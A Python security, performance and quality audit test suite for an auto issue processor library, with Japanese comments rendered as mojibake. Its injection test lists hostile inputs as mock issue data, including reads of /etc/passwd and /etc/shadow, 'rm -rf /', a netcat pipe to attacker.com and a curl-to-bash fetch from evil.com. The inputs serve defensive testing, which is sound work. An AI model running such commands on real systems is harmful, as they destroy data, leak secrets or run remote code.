#!/usr/bin/env python3
"""
çµ±ä¸€Auto Issue Processor å³æ ¼ç›£æŸ»ãƒ†ã‚¹ãƒˆã‚¹ã‚¤ãƒ¼ãƒˆ
ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã€ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã€å“è³ªã€ä¿¡é ¼æ€§ã®åŒ…æ‹¬çš„æ¤œè¨¼
"""

import asyncio
import os
import sys
import time
import tempfile
import shutil
import psutil
import json
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Any, Optional
import unittest
from unittest.mock import Mock, patch, AsyncMock, MagicMock

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from libs.auto_issue_processor import AutoIssueProcessor, ProcessorConfig
from libs.auto_issue_processor.utils import ProcessLock
from libs.auto_issue_processor.features import (
    ErrorRecoveryHandler,
    PullRequestManager,
    ParallelProcessor,
    FourSagesIntegration
)


class SecurityAudit:
    """ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»"""
    
    @staticmethod
    def test_token_exposure():
        """ãƒˆãƒ¼ã‚¯ãƒ³éœ²å‡ºãƒ†ã‚¹ãƒˆ"""
        vulnerabilities = []
        
        # 1. è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã«ãƒˆãƒ¼ã‚¯ãƒ³ãŒãƒãƒ¼ãƒ‰ã‚³ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ãªã„ã‹
        config_files = [
            "configs/auto_issue_processor.yaml",
            "configs/elder_scheduler_config.yaml"
        ]
        
        for config_file in config_files:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    content = f.read()
                    if "ghp_" in content or "github_pat_" in content:
                        vulnerabilities.append(f"âŒ ãƒˆãƒ¼ã‚¯ãƒ³ãŒãƒãƒ¼ãƒ‰ã‚³ãƒ¼ãƒ‰: {config_file}")
        
        # 2. ãƒ­ã‚°ã«ãƒˆãƒ¼ã‚¯ãƒ³ãŒå‡ºåŠ›ã•ã‚Œãªã„ã‹
        test_config = ProcessorConfig()
        test_config.github.token = "ghp_test_secret_token_12345"
        
        # ãƒ­ã‚°ã‚­ãƒ£ãƒ—ãƒãƒ£
        import logging
        import io
        log_capture = io.StringIO()
        handler = logging.StreamHandler(log_capture)
        logger = logging.getLogger("libs.auto_issue_processor")
        logger.addHandler(handler)
        
        try:
            processor = AutoIssueProcessor(test_config)
            log_output = log_capture.getvalue()
            
            if "ghp_test_secret_token" in log_output:
                vulnerabilities.append("âŒ ãƒˆãƒ¼ã‚¯ãƒ³ãŒãƒ­ã‚°ã«éœ²å‡º")
        except:
            pass
        finally:
            logger.removeHandler(handler)
        
        # 3. ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã«ãƒˆãƒ¼ã‚¯ãƒ³ãŒå«ã¾ã‚Œãªã„ã‹
        try:
            test_config.github.token = "ghp_secret_123"
            processor = AutoIssueProcessor(test_config)
            # æ„å›³çš„ã«ã‚¨ãƒ©ãƒ¼ã‚’ç™ºç”Ÿã•ã›ã‚‹
            processor._github = None
            processor.github  # ã“ã‚Œã§ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã™ã‚‹ã¯ãš
        except Exception as e:
            if "ghp_secret" in str(e):
                vulnerabilities.append("âŒ ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã«ãƒˆãƒ¼ã‚¯ãƒ³ãŒéœ²å‡º")
        
        return vulnerabilities
    
    @staticmethod
    def test_injection_vulnerabilities():
        """ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³è„†å¼±æ€§ãƒ†ã‚¹ãƒˆ"""
        vulnerabilities = []
        
        # 1. ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³
        dangerous_paths = [
            "../../../etc/passwd",
            "/etc/shadow",
            "../../secrets.env",
            "; rm -rf /",
            "$(whoami)",
            "`id`"
        ]
        
        # ãƒ‘ã‚¹ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã®ãƒã‚§ãƒƒã‚¯
        for path in dangerous_paths:
            # ãƒ­ãƒƒã‚¯ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã®æ¤œè¨¼
            safe_path = path.replace("/", "_").replace(".", "_")
            if path != safe_path and ("/" in path or ".." in path):
                vulnerabilities.append(f"âš ï¸ å±é™ºãªãƒ‘ã‚¹æ–‡å­—ã‚’æ¤œè¨¼ã™ã¹ã: {path}")
        
        # 2. ã‚³ãƒãƒ³ãƒ‰ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³
        config = ProcessorConfig()
        dangerous_inputs = [
            "test; echo hacked",
            "test && rm -rf /",
            "test | nc attacker.com 1234",
            "$(curl http://evil.com/hack.sh | bash)"
        ]
        
        for dangerous_input in dangerous_inputs:
            # Issue titleã‚„bodyã«å±é™ºãªå…¥åŠ›
            mock_issue = Mock()
            mock_issue.title = dangerous_input
            mock_issue.body = dangerous_input
            
            # å‡¦ç†ã•ã‚Œã¦ã‚‚å®‰å…¨ã‹ç¢ºèª
            # å®Ÿéš›ã®å‡¦ç†ã¯ãƒ¢ãƒƒã‚¯ãªã®ã§å®Ÿè¡Œã•ã‚Œãªã„
        
        return vulnerabilities
    
    @staticmethod
    def test_permission_escalation():
        """æ¨©é™æ˜‡æ ¼ãƒ†ã‚¹ãƒˆ"""
        vulnerabilities = []
        
        # 1. ãƒ•ã‚¡ã‚¤ãƒ«æ¨©é™ãƒã‚§ãƒƒã‚¯
        sensitive_files = [
            ".issue_locks",
            "configs/auto_issue_processor.yaml",
            "logs/auto_issue_processor.log"
        ]
        
        for file_path in sensitive_files:
            if os.path.exists(file_path):
                stat = os.stat(file_path)
                mode = oct(stat.st_mode)[-3:]
                # è¤‡é›‘ãªæ¡ä»¶åˆ¤å®š
                if mode != "600" and mode != "644" and mode != "755":
                    vulnerabilities.append(f"âš ï¸ ä¸é©åˆ‡ãªæ¨©é™: {file_path} ({mode})")
        
        # 2. ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã®å®‰å…¨æ€§ï¼ˆåŒæœŸçš„ã«ãƒã‚§ãƒƒã‚¯ï¼‰
        # ProcessLockãŒä½œæˆã™ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã¯asyncãªã®ã§ã€ã“ã“ã§ã¯ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®æ¨©é™ã®ã¿ãƒã‚§ãƒƒã‚¯
        test_dir = Path("./test_security_locks")
        test_dir.mkdir(exist_ok=True)
        try:
            stat = os.stat(test_dir)
            mode = oct(stat.st_mode)[-3:]
            if int(mode[2]) > 5:  # ãã®ä»–ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒèª­ã¿å–ã‚Šãƒ»å®Ÿè¡Œå¯èƒ½
                vulnerabilities.append(f"âš ï¸ ãƒ­ãƒƒã‚¯ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒä»–ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½: {mode}")
        finally:
            if test_dir.exists():
                shutil.rmtree(test_dir)
        
        return vulnerabilities


class PerformanceAudit:
    """ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ç›£æŸ»"""
    
    @staticmethod
    async def test_memory_leaks():
        """ãƒ¡ãƒ¢ãƒªãƒªãƒ¼ã‚¯ãƒ†ã‚¹ãƒˆ"""
        issues = []
        
        # åˆæœŸãƒ¡ãƒ¢ãƒªä½¿ç”¨é‡
        process = psutil.Process()
        initial_memory = process.memory_info().rss / 1024 / 1024  # MB
        
        config = ProcessorConfig()
        config.dry_run = True
        
        # 100å›ã®ç¹°ã‚Šè¿”ã—å‡¦ç†
        for i in range(100):
            processor = AutoIssueProcessor(config)
            # ç°¡å˜ãªå‡¦ç†ã‚’å®Ÿè¡Œ
            await processor._cleanup()
            
            if i % 20 == 0:
                current_memory = process.memory_info().rss / 1024 / 1024
                memory_increase = current_memory - initial_memory
                if memory_increase > 50:  # 50MBä»¥ä¸Šã®å¢—åŠ 
                    issues.append(f"âŒ ãƒ¡ãƒ¢ãƒªãƒªãƒ¼ã‚¯æ¤œå‡º: {memory_increase:.1f}MBå¢—åŠ  (iteration {i})")
        
        # æœ€çµ‚ãƒ¡ãƒ¢ãƒªä½¿ç”¨é‡
        final_memory = process.memory_info().rss / 1024 / 1024
        total_increase = final_memory - initial_memory
        
        if total_increase > 100:  # 100MBä»¥ä¸Šã®å¢—åŠ 
            issues.append(f"âŒ æ·±åˆ»ãªãƒ¡ãƒ¢ãƒªãƒªãƒ¼ã‚¯: {total_increase:.1f}MBå¢—åŠ ")
        elif total_increase > 50:
            issues.append(f"âš ï¸ ãƒ¡ãƒ¢ãƒªä½¿ç”¨é‡å¢—åŠ : {total_increase:.1f}MB")
        
        return issues
    
    @staticmethod
    async def test_concurrent_performance():
        """ä¸¦è¡Œå‡¦ç†ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ãƒ†ã‚¹ãƒˆ"""
        issues = []
        
        config = ProcessorConfig()
        config.dry_run = True
        config.features.parallel_processing = True
        config.processing.max_parallel_workers = 5
        
        # è¤‡æ•°ã®Issueã‚’åŒæ™‚å‡¦ç†
        mock_issues = []
        for i in range(10):
            issue = Mock()
            issue.number = i
            issue.title = f"Test Issue {i}"
            issue.body = "Test body"
            issue.created_at = datetime.now()
            issue.labels = []
            issue.comments = 0
            issue.pull_request = None
            mock_issues.append(issue)
        
        processor = AutoIssueProcessor(config)
        
        start_time = time.time()
        
        # ä¸¦åˆ—å‡¦ç†ã®ãƒ†ã‚¹ãƒˆ
        with patch.object(processor, '_get_issues_to_process', return_value=mock_issues):
            with patch.object(processor, '_execute_issue_processing', return_value={"success": True, "artifacts": {}}):
                result = await processor.process_issues()
        
        elapsed = time.time() - start_time
        
        # ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹åŸºæº–
        if elapsed > 30:  # 30ç§’ä»¥ä¸Š
            issues.append(f"âŒ ä¸¦åˆ—å‡¦ç†ãŒé…ã„: {elapsed:.1f}ç§’ (10 issues)")
        elif elapsed > 15:
            issues.append(f"âš ï¸ ä¸¦åˆ—å‡¦ç†ã®ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹æ”¹å–„ä½™åœ°: {elapsed:.1f}ç§’")
        
        # CPUä½¿ç”¨ç‡ãƒã‚§ãƒƒã‚¯
        cpu_percent = psutil.cpu_percent(interval=0.1)
        if cpu_percent > 80:
            issues.append(f"âš ï¸ é«˜CPUä½¿ç”¨ç‡: {cpu_percent}%")
        
        return issues
    
    @staticmethod
    async def test_resource_limits():
        """ãƒªã‚½ãƒ¼ã‚¹åˆ¶é™ãƒ†ã‚¹ãƒˆ"""
        issues = []
        
        # 1. ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‡ã‚£ã‚¹ã‚¯ãƒªãƒ—ã‚¿ãƒªãƒ¼ã‚¯
        initial_fds = len(psutil.Process().open_files())
        
        config = ProcessorConfig()
        config.dry_run = True
        
        # 50å›ã®å‡¦ç†
        for _ in range(50):
            processor = AutoIssueProcessor(config)
            lock = ProcessLock("file")
            await lock.acquire(f"test_{_}", ttl=1)
            await lock.release(f"test_{_}")
        
        final_fds = len(psutil.Process().open_files())
        fd_increase = final_fds - initial_fds
        
        if fd_increase > 10:
            issues.append(f"âŒ ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‡ã‚£ã‚¹ã‚¯ãƒªãƒ—ã‚¿ãƒªãƒ¼ã‚¯: {fd_increase}å€‹å¢—åŠ ")
        
        # 2. ã‚¹ãƒ¬ãƒƒãƒ‰/ãƒ—ãƒ­ã‚»ã‚¹æ•°
        thread_count = psutil.Process().num_threads()
        if thread_count > 50:
            issues.append(f"âš ï¸ éå‰°ãªã‚¹ãƒ¬ãƒƒãƒ‰æ•°: {thread_count}")
        
        return issues


class QualityAudit:
    """å“è³ªç›£æŸ»"""
    
    @staticmethod
    def test_error_handling():
        """ã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ç›£æŸ»"""
        issues = []
        
        config = ProcessorConfig()
        config.features.error_recovery = True
        
        # 1. è¨­å®šã‚¨ãƒ©ãƒ¼
        invalid_config = ProcessorConfig()
        invalid_config.processing.max_issues_per_run = 0  # ç„¡åŠ¹ãªå€¤
        
        if invalid_config.validate():
            issues.append("âŒ ç„¡åŠ¹ãªè¨­å®šã‚’æ¤œå‡ºã§ããªã„")
        
        # 2. GitHub APIã‚¨ãƒ©ãƒ¼ã®å‡¦ç†
        processor = AutoIssueProcessor(config)
        
        # GitHubãƒˆãƒ¼ã‚¯ãƒ³ãªã—ã§ã®å®Ÿè¡Œ
        config.github.token = None
        try:
            processor = AutoIssueProcessor(config)
            # ã“ã‚Œã¯ã‚¨ãƒ©ãƒ¼ã«ãªã‚‹ã¹ã
            _ = processor.github
            issues.append("âŒ GitHubãƒˆãƒ¼ã‚¯ãƒ³ãªã—ã§ã‚‚ã‚¨ãƒ©ãƒ¼ã«ãªã‚‰ãªã„")
        except ValueError:
            pass  # æœŸå¾…ã•ã‚Œã‚‹å‹•ä½œ
        except Exception as e:
            issues.append(f"âš ï¸ äºˆæœŸã—ãªã„ã‚¨ãƒ©ãƒ¼ã‚¿ã‚¤ãƒ—: {type(e)}")
        
        # 3. ãƒ­ãƒƒã‚¯ã‚¨ãƒ©ãƒ¼ã®å‡¦ç†
        lock = ProcessLock("file")
        
        # å­˜åœ¨ã—ãªã„ã‚­ãƒ¼ã®è§£æ”¾ã¯åˆ¥ã®éåŒæœŸãƒ†ã‚¹ãƒˆã§å®Ÿæ–½
        # ã“ã“ã§ã¯è¨­å®šã®æ¤œè¨¼ã®ã¿
        
        return issues
    
    @staticmethod
    def test_data_integrity():
        """ãƒ‡ãƒ¼ã‚¿æ•´åˆæ€§ç›£æŸ»"""
        issues = []
        
        # 1. è¨­å®šã®æ°¸ç¶šåŒ–
        config1 = ProcessorConfig()
        config1.processing.max_issues_per_run = 5
        config_dict = config1.to_dict()
        
        # è¾æ›¸ã‹ã‚‰å†æ§‹ç¯‰
        config2 = ProcessorConfig()
        # æœ¬æ¥ã¯ from_dict ãƒ¡ã‚½ãƒƒãƒ‰ãŒå¿…è¦
        
        # 2. ãƒ­ãƒƒã‚¯æƒ…å ±ã®æ•´åˆæ€§ã¯éåŒæœŸãƒ†ã‚¹ãƒˆã§å®Ÿæ–½
        # ã“ã“ã§ã¯ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®å­˜åœ¨ç¢ºèªã®ã¿
        test_lock_dir = Path("./test_integrity_locks")
        test_lock_dir.mkdir(exist_ok=True)
        
        if not test_lock_dir.exists():
            issues.append("âŒ ãƒ­ãƒƒã‚¯ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’ä½œæˆã§ããªã„")
        
        # ã‚¯ãƒªãƒ¼ãƒ³ã‚¢ãƒƒãƒ—
        if test_lock_dir.exists():
            shutil.rmtree(test_lock_dir)
        
        # 3. çµ±è¨ˆæƒ…å ±ã®æ­£ç¢ºæ€§
        config = ProcessorConfig()
        config.dry_run = True
        processor = AutoIssueProcessor(config)
        
        # åˆæœŸçŠ¶æ…‹
        if processor.stats["processed"] != 0:
            issues.append("âŒ åˆæœŸçµ±è¨ˆãŒä¸æ­£")
        
        return issues
    
    @staticmethod
    async def test_edge_cases():
        """ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹ç›£æŸ»"""
        issues = []
        
        config = ProcessorConfig()
        config.dry_run = True
        
        # 1. ç©ºã®Issueãƒªã‚¹ãƒˆ
        processor = AutoIssueProcessor(config)
        result = await processor.process_issues([])
        
        if not result["success"]:
            issues.append("âŒ ç©ºã®Issueãƒªã‚¹ãƒˆã§å¤±æ•—")
        
        # 2. è¶…å¤§é‡ã®Issue
        huge_list = list(range(10000))
        with patch.object(processor, '_get_issues_to_process', return_value=[]):
            # å®Ÿéš›ã«ã¯å‡¦ç†ã—ãªã„ãŒã€ãƒ¡ãƒ¢ãƒªã‚¨ãƒ©ãƒ¼ãªã©ãŒç™ºç”Ÿã—ãªã„ã‹
            result = await processor.process_issues(huge_list)
        
        # 3. åŒã˜Issueã®é‡è¤‡å‡¦ç†
        duplicate_issues = [123, 123, 123]
        with patch.object(processor, '_get_issues_to_process', return_value=[]):
            result = await processor.process_issues(duplicate_issues)
        
        # 4. ç„¡åŠ¹ãªIssueç•ªå·
        invalid_issues = [-1, 0, None, "abc", float('inf')]
        for invalid in invalid_issues:
            try:
                result = await processor.process_issues([invalid])
            except:
                pass  # ã‚¨ãƒ©ãƒ¼ã¯æœŸå¾…ã•ã‚Œã‚‹
        
        return issues


class IntegrationAudit:
    """çµ±åˆç›£æŸ»"""
    
    @staticmethod
    async def test_scheduler_integration():
        """ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ©ãƒ¼çµ±åˆç›£æŸ»"""
        issues = []
        
        # Elder Scheduled Tasksã¨ã®çµ±åˆç¢ºèª
        try:
            from libs.elder_scheduled_tasks import ElderScheduledTasks
            
            # ã‚¿ã‚¹ã‚¯ãŒã‚¤ãƒ³ãƒãƒ¼ãƒˆå¯èƒ½ã‹
            tasks = ElderScheduledTasks()
            
            # auto_issue_processorã‚¿ã‚¹ã‚¯ã®å­˜åœ¨ç¢ºèª
            # å®Ÿéš›ã®ãƒ†ã‚¹ãƒˆã¯å®Ÿè¡Œã—ãªã„ï¼ˆç„¡åŠ¹åŒ–ã•ã‚Œã¦ã„ã‚‹ãŸã‚ï¼‰
            
        except ImportError as e:
            issues.append(f"âŒ ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ©ãƒ¼çµ±åˆã‚¨ãƒ©ãƒ¼: {e}")
        
        return issues
    
    @staticmethod
    async def test_four_sages_integration():
        """4è³¢è€…çµ±åˆç›£æŸ»"""
        issues = []
        
        config = ProcessorConfig()
        config.features.four_sages_integration = True
        
        processor = AutoIssueProcessor(config)
        
        if not processor.four_sages:
            issues.append("âŒ 4è³¢è€…çµ±åˆãŒåˆæœŸåŒ–ã•ã‚Œã¦ã„ãªã„")
        else:
            # å„è³¢è€…ã®å­˜åœ¨ç¢ºèª
            sages = processor.four_sages
            
            if not hasattr(sages, 'knowledge_sage'):
                issues.append("âŒ ãƒŠãƒ¬ãƒƒã‚¸è³¢è€…ãŒå­˜åœ¨ã—ãªã„")
            if not hasattr(sages, 'task_sage'):
                issues.append("âŒ ã‚¿ã‚¹ã‚¯è³¢è€…ãŒå­˜åœ¨ã—ãªã„")
            if not hasattr(sages, 'incident_sage'):
                issues.append("âŒ ã‚¤ãƒ³ã‚·ãƒ‡ãƒ³ãƒˆè³¢è€…ãŒå­˜åœ¨ã—ãªã„")
            if not hasattr(sages, 'rag_sage'):
                issues.append("âŒ RAGè³¢è€…ãŒå­˜åœ¨ã—ãªã„")
        
        return issues


async def run_all_audits():
    """ã™ã¹ã¦ã®ç›£æŸ»ã‚’å®Ÿè¡Œ"""
    print("=" * 80)
    print("çµ±ä¸€Auto Issue Processor å³æ ¼ç›£æŸ»")
    print("=" * 80)
    print(f"å®Ÿè¡Œæ™‚åˆ»: {datetime.now()}")
    print()
    
    all_issues = []
    
    # 1. ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»
    print("ğŸ”’ ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»")
    print("-" * 40)
    
    security_issues = []
    security_issues.extend(SecurityAudit.test_token_exposure())
    security_issues.extend(SecurityAudit.test_injection_vulnerabilities())
    security_issues.extend(SecurityAudit.test_permission_escalation())
    
    if security_issues:
        for issue in security_issues:
            print(f"  {issue}")
        all_issues.extend(security_issues)
    else:
        print("  âœ… ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å•é¡Œãªã—")
    print()
    
    # 2. ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ç›£æŸ»
    print("âš¡ ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ç›£æŸ»")
    print("-" * 40)
    
    perf_issues = []
    perf_issues.extend(await PerformanceAudit.test_memory_leaks())
    perf_issues.extend(await PerformanceAudit.test_concurrent_performance())
    perf_issues.extend(await PerformanceAudit.test_resource_limits())
    
    if perf_issues:
        for issue in perf_issues:
            print(f"  {issue}")
        all_issues.extend(perf_issues)
    else:
        print("  âœ… ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹å•é¡Œãªã—")
    print()
    
    # 3. å“è³ªç›£æŸ»
    print("ğŸ“Š å“è³ªç›£æŸ»")
    print("-" * 40)
    
    quality_issues = []
    quality_issues.extend(QualityAudit.test_error_handling())
    quality_issues.extend(QualityAudit.test_data_integrity())
    quality_issues.extend(await QualityAudit.test_edge_cases())
    
    if quality_issues:
        for issue in quality_issues:
            print(f"  {issue}")
        all_issues.extend(quality_issues)
    else:
        print("  âœ… å“è³ªå•é¡Œãªã—")
    print()
    
    # 4. çµ±åˆç›£æŸ»
    print("ğŸ”— çµ±åˆç›£æŸ»")
    print("-" * 40)
    
    integration_issues = []
    integration_issues.extend(await IntegrationAudit.test_scheduler_integration())
    integration_issues.extend(await IntegrationAudit.test_four_sages_integration())
    
    if integration_issues:
        for issue in integration_issues:
            print(f"  {issue}")
        all_issues.extend(integration_issues)
    else:
        print("  âœ… çµ±åˆå•é¡Œãªã—")
    print()
    
    # ç·åˆçµæœ
    print("=" * 80)
    print("ç›£æŸ»çµæœã‚µãƒãƒªãƒ¼")
    print("=" * 80)
    
    critical_count = len([i for i in all_issues if i.startswith("âŒ")])
    warning_count = len([i for i in all_issues if i.startswith("âš ï¸")])
    
    print(f"ğŸ”´ é‡å¤§ãªå•é¡Œ: {critical_count}ä»¶")
    print(f"ğŸŸ¡ è­¦å‘Š: {warning_count}ä»¶")
    print(f"ğŸ“‹ ç·å•é¡Œæ•°: {len(all_issues)}ä»¶")
    print()
    
    if critical_count > 0:
        print("âŒ ç›£æŸ»å¤±æ•—: é‡å¤§ãªå•é¡ŒãŒç™ºè¦‹ã•ã‚Œã¾ã—ãŸ")
        print("   æœ¬ç•ªç’°å¢ƒã§ã®ä½¿ç”¨ã¯æ¨å¥¨ã•ã‚Œã¾ã›ã‚“")
    elif warning_count > 0:
        print("âš ï¸ ç›£æŸ»åˆæ ¼ï¼ˆæ¡ä»¶ä»˜ãï¼‰: è­¦å‘Šäº‹é …ãŒã‚ã‚Šã¾ã™")
        print("   æ”¹å–„ã‚’æ¤œè¨ã—ã¦ãã ã•ã„")
    else:
        print("âœ… ç›£æŸ»åˆæ ¼: ã™ã¹ã¦ã®ãƒ†ã‚¹ãƒˆã‚’ãƒ‘ã‚¹ã—ã¾ã—ãŸ")
        print("   æœ¬ç•ªç’°å¢ƒã§ã®ä½¿ç”¨ãŒå¯èƒ½ã§ã™")
    
    # ç›£æŸ»ãƒ¬ãƒãƒ¼ãƒˆä¿å­˜
    report = {
        "audit_date": datetime.now().isoformat(),
        "critical_issues": critical_count,
        "warnings": warning_count,
        "total_issues": len(all_issues),
        "details": all_issues,
        "passed": critical_count == 0
    }
    
    report_file = f"logs/audit_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    os.makedirs("logs", exist_ok=True)
    
    with open(report_file, 'w') as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    
    print(f"\nğŸ“„ ç›£æŸ»ãƒ¬ãƒãƒ¼ãƒˆä¿å­˜: {report_file}")
    
    return critical_count == 0


if __name__ == "__main__":
    # ã‚¯ãƒªãƒ¼ãƒ³ã‚¢ãƒƒãƒ—
    if os.path.exists(".issue_locks"):
        shutil.rmtree(".issue_locks")
    
    # ç›£æŸ»å®Ÿè¡Œ
    success = asyncio.run(run_all_audits())
    
    # çµ‚äº†ã‚³ãƒ¼ãƒ‰
    sys.exit(0 if success else 1)